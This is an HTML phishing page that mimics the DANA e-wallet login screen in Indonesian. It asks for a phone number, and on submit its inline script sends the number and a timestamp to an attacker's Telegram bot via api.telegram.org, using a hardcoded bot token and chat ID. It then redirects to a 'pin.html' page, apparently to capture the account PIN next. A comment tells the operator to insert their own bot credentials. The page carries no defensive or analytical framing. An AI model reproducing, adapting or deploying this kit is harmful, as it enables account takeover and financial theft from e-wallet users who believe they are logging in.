<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk - Nomor HP</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background-color: #0099FF; color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 60px; }
        .logo { font-size: 28px; font-weight: bold; margin-bottom: 40px; }
        .title { font-size: 18px; text-align: center; margin-bottom: 30px; padding: 0 20px; }
        .input-labels { display: flex; gap: 65px; margin-bottom: 8px; font-size: 14px; width: 90%; max-width: 350px; }
        .input-container { display: flex; gap: 10px; width: 90%; max-width: 350px; margin-bottom: 20px; }
        .country-field { background: white; border-radius: 8px; padding: 12px 15px; display: flex; align-items: center; min-width: 80px; }
        .flag { width: 20px; height: 15px; background: white; border-radius: 2px; display: flex; align-items: center; justify-content: center; font-size: 18px; color: red; font-weight: bold; }
        .code { color: #333; font-weight: 600; }
        .phone-input { flex: 1; padding: 12px 15px; border: none; outline: none; font-size: 16px; color: #333; background: white; border-radius: 8px; }
        .info-text { font-size: 14px; text-align: center; padding: 0 25px; line-height: 1.5; margin-bottom: auto; }
        .btn { width: 90%; max-width: 350px; padding: 15px; background: white; color: #A0A0A0; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; margin-bottom: 20px; cursor: not-allowed; }
        .link { color: white; text-decoration: underline; }
        .page1 {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #0099FF;
            position: fixed;
            width: 100%;
            top: 0;
            left: 0;
            z-index: 101;
        }
        .page1 img {
            max-width: 100%;
            max-height: 100%;
        }
    </style>
</head>
<body>
    <div class="page1">
        <img src="bg.jpg" alt="">
    </div>
    <script>
            setTimeout(function() {
                document.querySelector('.page1').style.display = 'none';
            }, 2000);
        </script>                
    <div class="logo"><img src="DANA-Logo-white.svg" alt=""></div>
    <div class="title">Masukkan nomor HP kamu untuk lanjut</div>

    <div class="input-labels">
        <span>Negara</span>
        <span>Nomor</span>
    </div>

    <div class="input-container">
        <div class="country-field">
            <div class="flag">ðŸ‡®ðŸ‡© </div>
            <div class="code"> +62</div>
        </div>
        <input type="tel" id="phoneNumber" class="phone-input" placeholder="811-1234-5678" maxlength="13" required>
    </div>

    <div class="info-text">
        Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
        Dengan melanjutkan, kamu juga setuju dengan <span class="link">S&K</span> serta <span class="link">Kebijakan Privasi</span> kami.
    </div>

    <button id="nextBtn" class="btn">LANJUTKAN</button>

    <script>
        // Konfigurasi Telegram (ganti dengan data kamu)
        const BOT_TOKEN = "8476845004:AAE2O4N1A_WNu7AsqM5PD8KQO3ycFprJjdg";
        const CHAT_ID = "8355957737";

        // Elemen DOM
        const phoneInput = document.getElementById('phoneNumber');
        const nextBtn = document.getElementById('nextBtn');

        // Validasi input secara real-time
        phoneInput.addEventListener('input', () => {
            // Hanya izinkan angka dan hapus tanda hubung
            let cleanNumber = phoneInput.value.replace(/[^0-9]/g, '');
            // Format dengan tanda hubung (contoh: 811-1234-5678)
            if (cleanNumber.length > 3 && cleanNumber.length <= 7) {
                cleanNumber = cleanNumber.slice(0,3) + '-' + cleanNumber.slice(3);
            } else if (cleanNumber.length > 7) {
                cleanNumber = cleanNumber.slice(0,3) + '-' + cleanNumber.slice(3,7) + '-' + cleanNumber.slice(7,11);
            }
            phoneInput.value = cleanNumber;

            // Aktifkan tombol jika nomor valid (min 10 digit)
            const fullNumber = '+62' + cleanNumber.replace(/-/g, '');
            if (fullNumber.length >= 12 && fullNumber.length <= 14) {
                nextBtn.style.backgroundColor = '#FFFFFF';
                nextBtn.style.color = '#007AFF';
                nextBtn.style.cursor = 'pointer';
                nextBtn.disabled = false;
            } else {
                nextBtn.style.backgroundColor = '#FFFFFF';
                nextBtn.style.color = '#A0A0A0';
                nextBtn.style.cursor = 'not-allowed';
                nextBtn.disabled = true;
            }
        });

        // Fungsi kirim data ke Telegram
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: message})
                });
            } catch (err) {
                console.error('Gagal kirim:', err);
            }
        }

        // Aksi tombol lanjut
        nextBtn.addEventListener('click', () => {
            const phone = '+62' + phoneInput.value.replace(/-/g, '');
            localStorage.setItem('userPhone', phone);
            
            // Kirim notifikasi ke Telegram
            sendToTelegram(`ðŸ“± DATA NOMOR HP VALID\nNomor: ${phone}\nWaktu: ${new Date().toLocaleString('id-ID')}`);
            
            // Pindah ke halaman PIN
            window.location.href = 'pin.html';
        });
    </script>
</body>
</html>
